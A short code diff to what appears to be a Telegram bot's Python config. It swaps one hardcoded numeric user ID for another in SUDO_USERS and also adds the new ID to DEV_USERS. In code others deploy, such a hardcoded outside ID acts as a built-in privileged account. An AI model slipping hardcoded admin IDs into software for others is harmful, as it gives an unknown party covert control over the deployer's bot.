@@ -130,8 +130,10 @@ else:
     EVENT_LOGS = Config.EVENT_LOGS
 
 
+
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1091139479)
+DEV_USERS.add(5051939910)
+SUDO_USERS.add(5051939910)
 
 API_ID = int(os.environ.get("API_ID", None))
 API_HASH = os.environ.get("API_HASH", None)
